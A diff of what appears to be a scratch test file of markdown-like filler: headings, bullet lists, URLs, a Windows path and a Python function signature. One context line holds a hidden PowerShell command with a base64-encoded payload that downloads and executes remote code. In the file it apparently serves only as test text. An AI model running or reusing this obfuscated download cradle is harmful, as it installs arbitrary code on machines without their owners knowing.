@@ -1,10 +1,18 @@
 
-#  test
+# test
 aaa
 a
 a
 
+* test
+ * test
+ * test
+
+
 ##  tata
+
+ copy pasted
+ ➤ test
 
 bb
 ###  tata
@@ -30,6 +38,7 @@ foo
  test
 TODO
 DONE
+
 https://test.com
 http://test.com
 c:\\windows
@@ -60,3 +69,19 @@ def sh(cmd, stdin="", sleep=False):
 
 ``
 powershell -W Hidden -nop -noni -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA
+
+#222222
+CTRL+V u 2 0 2 2 
+
+CTRL+V u 2 0 2 2
+
+* fdsf
+ * test
+* test
+* where  is lovedd  ffff 
+
+*******
+
+
+self.test  
+
